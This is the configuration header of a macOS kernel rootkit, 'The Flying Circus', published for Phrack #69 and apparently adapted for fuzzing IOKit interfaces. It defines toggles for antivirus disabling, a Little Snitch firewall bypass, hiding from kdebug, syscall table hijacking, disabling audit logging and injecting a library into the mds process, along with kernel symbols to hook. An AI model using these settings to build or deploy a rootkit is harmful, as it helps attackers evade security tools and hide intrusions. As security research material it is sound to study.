/*
 *   _____   _                          ___     _      _  _     _              __ _
 *  |_   _| | |_      ___      o O O   | __|   | |    | || |   (_)    _ _     / _` |
 *    | |   | ' \    / -_)    o        | _|    | |     \_, |   | |   | ' \    \__, |
 *   _|_|_  |_||_|   \___|   TS__[O]  _|_|_   _|_|_   _|__/   _|_|_  |_||_|   |___/
 * _|"""""|_|"""""|_|"""""| {======|_| """ |_|"""""|_| """"|_|"""""|_|"""""|_|"""""|
 * "`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *            ___      _
 *    o O O  / __|    (_)      _ _    __     _  _     ___
 *   o      | (__     | |     | '_|  / _|   | +| |   (_-<
 *  TS__[O]  \___|   _|_|_   _|_|_   \__|_   \_,_|   /__/_
 *  {======|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
 * ./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *
 * And now for something completely different...
 *
 * A Mountain Lion rootkit for Phrack #69!
 *
 * Copyright (c) fG!, 2012, 2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * configuration.h
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#ifndef the_flying_circus_configs_h
#define the_flying_circus_configs_h

#include "messages.h"
#include "utils/kernel_IOUserClient.h"
// rootkit features configuration
#define ZOMBIE_MODE          0      // activate the zombie mode , can be combined with all other options below
#define AVMONSTER_MODE       0      // activate AV-Monster II
#define KDEBUG_MODE          0      // hide from kdebug
#define DEVICE_MODE          0      // enable character device for rootkit commands
#define KCONTROL_MODE        0      // enable kernel control for rootkit commands
#define EXECCMD_MODE         0      // execute a sample userland command
#define HIJACKSYSENT_MODE    0      // mode 1 is by changing pointers in the table, 2 using a sysent copy
#define ANTILITTLESNICH_MODE 0      // activate bypass of Little Snitch
#define NUKEHEADERS_MODE     0      // cleanup rootkit headers, in normal and zombie mode
#define AUDIT_MODE           0      // disable audit features by NOPing the call to audit_commit()
                                    // Note: the example like it's implemented has a huge mem leak
                                    //       check audit.c to understand why
// debug settings - you probably want to undefine :-)
#define DEBUG 1
#define DEBUG_FUNCTIONS 1
#define DEBUG_KDEBUG 1
//@flyic moony_li@trendmicro.com
//for mac 10.10
#define MACH_KERNEL         "/System/Library/Kernels/kernel.development"      // location of kernel in filesystem
//#define MACH_KERNEL         "/System/Library/Kernels/kernel"
//#define MACH_KERNEL         "/mach_kernel"      // location of kernel in filesystem
#define CHARACTER_DEVICE    "circus"            // the name of character device to create
#define PIGGYBACK_PROCESS   "mds"               // the process to inject the library
#define INJECTED_LIBRARY    "/tmp/circus.dylib" // location of the library to inject
#define XOR_KEY 0x45
#define EXECMD_TRAMPOLINE_FUNCTION "_proc_resetregister" // function to hook to execute userland commands
// type of write to userland processes, 0 is good
#define USERLAND_WRITE 0 // 0 - vm_map_write_user
                         // 1 - mach_vm_copy
                         // 2 - copyout

#define TRAMPOLINE_SIZE 12                      // the size of NOP trampoline to use

#define API_SYMBOL_IS_IO_SERVICE_OPEN_EXTENDED     "_is_io_service_open_extended"
#define API_SYMBOL_IS_IO_CONNECT_METHOD     "_is_io_connect_method"
#define API_SYMBOL_IS_IO_CONNECT_ASYNC_METHOD "_is_io_connect_async_method"
#define API_SYMBOL_KDP_PANIC_DUMP     "_kdp_panic_dump"
#define API_SYMBOL_IOKIT_USER_CLIENT_TRAP     "_iokit_user_client_trap"
#define API_SYMBOL_IPC_KMSG_SEND     "_ipc_kmsg_send"
#define API_SYMBOL_MACH_MSG_OVERWRITE_TRAP     "_mach_msg_overwrite_trap"
#define API_SYMBOL_COPY_IO  "_copyio"
#define API_SYMBOL_IPC_KMSG_GET  "_ipc_kmsg_get"
#define API_SYMBOL_CREATE_MAPPING_IN_TASK  "__ZN18IOMemoryDescriptor19createMappingInTaskEP4taskyjyy"
/*ffffff80008a1410 T __ZN18IOMemoryDescriptor19createMappingInTaskEP4taskyjyy*/


#define RECORD_PRODUCE_FILE_FOR_IS_IO_CONNECT_METHOD "/MOONY_RECORD_PRODUCED_IS_IO_CONNECT_METHOD.txt"

#define FUZZ_METHOD_RAND_MAYBE_LIMIT 9912
#define FUZZ_METHOD_RAND_MAYBE_MIN 1100
#define FUZZ_METHOD_RAND_MAYBE_MAX 7960
#define FLIP_MAX_BYTES  7
#define FLIP_MIN_BYTES  1
#define FLIP_N_RAND_LIMIT 699
#define FLIP_N_RAND_MIN  38
#define FLIP_N_RAND_MAX  177



#define FUZZ_METHOD_FIXED_OFFSET 0x47
#define OBJECT_CLASS_NAME_NO_FOUND "moony_object_class_name_not_found"

#define MAX_PROCESSER_CNT (1)
#define MAX_PROCESSER_REAL_CNT (5)
//#define CURRENT_PROCESSER_ID (0)
#define CURRENT_PROCESSER_ID_NOW ((MAX_PROCESSER_REAL_CNT -1<(get_current_cpu_no()))?MAX_PROCESSER_REAL_CNT -1:(get_current_cpu_no()))

#define CURRENT_PROCESSER_ID (0)

#define SERVICE_CONNECTION_TABLE_MAX (2)


#define MAX_FUZZ_SAMPLE_INFO_CNT (256)
#endif
